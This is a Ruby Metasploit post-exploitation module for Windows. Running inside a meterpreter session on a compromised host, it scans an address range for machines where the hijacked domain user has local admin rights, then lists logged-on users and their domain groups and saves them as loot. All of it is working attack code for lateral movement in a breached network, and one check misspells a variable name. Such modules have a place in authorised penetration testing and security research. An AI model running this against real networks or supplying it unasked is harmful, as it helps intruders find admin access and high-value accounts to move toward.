##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'Windows Gather Local Admin Search',
      'Description'  => %q{
        This module will identify systems in a given range that the
        supplied domain user (should migrate into a user pid) has administrative
        access to by using the Windows API OpenSCManagerA to establishing a handle
        to the remote host. Additionally it can enumerate logged in users and group
        membership via Windows API NetWkstaUserEnum and NetUserGetGroups.
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>',
          'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
          'Royce Davis "r3dy" <rdavis[at]accuvant.com>'
        ],
      'Platform'     => [ 'windows'],
      'SessionTypes' => [ 'meterpreter' ]
      ))

    register_options(
      [
        OptBool.new('ENUM_USERS', [ true, 'Enumerates logged on users.', true]),
        OptBool.new('ENUM_GROUPS', [ false, 'Enumerates groups for identified users.', true]),
        OptString.new('DOMAIN', [false, 'Domain to enumerate user\'s groups for']),
        OptString.new('DOMAIN_CONTROLLER', [false, 'Domain Controller to query groups'])
      ], self.class)
  end

  def setup
    super

    # This datastore option can be modified during runtime.
    # Saving it here so the modified value remains with this module.
    @domain_controller = datastore['DOMAIN_CONTROLLER']

    if is_system?
      # running as SYSTEM and will not pass any network credentials
      print_error "Running as SYSTEM, module should be run with USER level rights"
      return
    else
      @adv = client.railgun.advapi32

      # Get domain and domain controller if options left blank
      if datastore['DOMAIN'].nil? or datastore['DOMAIN'].empty?
        user = client.sys.config.getuid
        datastore['DOMAIN'] = user.split('\\')[0]
      end

      if @domain_controll.nil? and datastore['ENUM_GROUPS']
        @dc_error = false

        # Uses DC which applied policy since it would be a DC this device normally talks to
        cmd = "gpresult /SCOPE COMPUTER"
          # If Vista/2008 or later add /R
          if (sysinfo['OS'] =~ /Build [6-9]\d\d\d/)
            cmd << " /R"
          end
        res = cmd_exec("cmd.exe","/c #{cmd}")

        # Check if RSOP data exists, if not disable group check
        unless res =~ /does not have RSOP data./
          dc_applied = /Group Policy was applied from:\s*(.*)\s*/.match(res)
          if dc_applied
            @domain_controller = dc_applied[1].strip
          else
            @dc_error = true
            print_error("Could not read RSOP data, will not enumerate users and groups. Manually specify DC.")
          end
        else
          @dc_error = true
          print_error("User never logged into device, will not enumerate users and groups. Manually specify DC.")
        end
      end
    end
  end

  # main control method
  def run_host(ip)
    connect(ip)
  end

  # http://msdn.microsoft.com/en-us/library/windows/desktop/aa370669(v=vs.85).aspx
  # enumerate logged in users
  def enum_users(host)
    userlist = Array.new

    begin
      # Connect to host and enumerate logged in users
      winsessions = client.railgun.netapi32.NetWkstaUserEnum("\\\\#{host}", 1, 4, -1, 4, 4, nil)
    rescue ::Exception => e
      print_error("Issue enumerating users on #{host}")
      return userlist
    end

    return userlist if winsessions.nil?

    count = winsessions['totalentries'] * 2
    startmem = winsessions['bufptr']

    base = 0
    userlist = Array.new
    begin
      mem = client.railgun.memread(startmem, 8*count)
    rescue ::Exception => e
      print_error("Issue reading memory for #{host}")
      vprint_error(e.to_s)
      return userlist
    end
    # For each entry returned, get domain and name of logged in user
    begin
      count.times{|i|
        temp = {}
        userptr = mem[(base + 0),4].unpack("V*")[0]
        temp[:user] = client.railgun.memread(userptr,255).split("\0\0")[0].split("\0").join
        nameptr = mem[(base + 4),4].unpack("V*")[0]
        temp[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join

        # Ignore if empty or machine account
        unless temp[:user].empty? or temp[:user][-1, 1] == "$"

          # Check if enumerated user's domain matches supplied domain, if there was
          # an error, or if option disabled
          data = ""
          if datastore['DOMAIN'].upcase == temp[:domain].upcase and not @dc_error and datastore['ENUM_GROUPS']
            data << " - Groups: #{enum_groups(temp[:user]).chomp(", ")}"
          end
          line = "\tLogged in user:\t#{temp[:domain]}\\#{temp[:user]}#{data}\n"

          # Write user and groups to notes database
          db_note(host, "#{temp[:domain]}\\#{temp[:user]}#{data}", "localadmin.user.loggedin")
          userlist << line unless userlist.include? line

        end

        base = base + 8
      }
    rescue ::Exception => e
      print_error("Issue enumerating users on #{host}")
      vprint_error(e.backtrace)
    end
    return userlist
  end

  # http://msdn.microsoft.com/en-us/library/windows/desktop/aa370653(v=vs.85).aspx
  # Enumerate groups for identified users
  def enum_groups(user)
    grouplist = ""

    dc = "\\\\#{@domain_controller}"
    begin
      # Connect to DC and enumerate groups of user
      usergroups = client.railgun.netapi32.NetUserGetGroups(dc, user, 0, 4, -1, 4, 4)
    rescue ::Exception => e
      print_error("Issue connecting to DC, try manually setting domain and DC")
      vprint_error(e.to_s)
      return grouplist
    end

    count = usergroups['totalentries']
    startmem = usergroups['bufptr']
    base = 0

    begin
      mem = client.railgun.memread(startmem, 8*count)
    rescue ::Exception => e
      print_error("Issue reading memory for groups for user #{user}")
      vprint_error(e.to_s)
      return grouplist
    end

    begin
      # For each entry returned, get group
      count.to_i.times{|i|
          temp = {}
          groupptr = mem[(base + 0),4].unpack("V*")[0]
          temp[:group] = client.railgun.memread(groupptr,255).split("\0\0")[0].split("\0").join

          # Add group to string to be returned
          grouplist << "#{temp[:group]}, "
          if (i % 5) == 2
            grouplist <<"\n\t-   "
          end
          base = base + 4
      }

    rescue ::Exception => e
      print_error("Issue enumerating groups for user #{user}, check domain")
      vprint_error(e.backtrace)
      return grouplist
    end

    return grouplist.chomp("\n\t-   ")

  end

  # http://msdn.microsoft.com/en-us/library/windows/desktop/ms684323(v=vs.85).aspx
  # method to connect to remote host using windows api
  def connect(host)
    if @adv.nil?
      return
    end

    user = client.sys.config.getuid
    # use railgun and OpenSCManagerA api to connect to remote host
    manag = @adv.OpenSCManagerA("\\\\#{host}", nil, 0xF003F) # SC_MANAGER_ALL_ACCESS

    if(manag["return"] != 0) # we have admin rights
      result = "#{host.ljust(16)} #{user} - Local admin found\n"
      # Run enumerate users on all hosts if option was set

      if datastore['ENUM_USERS']
        enum_users(host).each {|i|
          result << i
        }
      end

      # close the handle if connection was made
      @adv.CloseServiceHandle(manag["return"])
      # Append data to loot table within database
      print_good(result.chomp("\n")) unless result.nil?
      db_loot(host, user, "localadmin.user")
    else
      # we dont have admin rights
      print_error("#{host.ljust(16)} #{user} - No Local Admin rights")
    end
  end

  # Write to notes database
  def db_note(host, data, type)
    report_note(
      :type  => type,
      :data  => data,
      :host  => host,
      :update => :unique_data
    )
  end

  # Write to loot database
  def db_loot(host, user, type)
    p = store_loot(type, 'text/plain', host, "#{host}:#{user}", 'hosts_localadmin.txt', user)
    vprint_status("User data stored in: #{p}")
  end
end
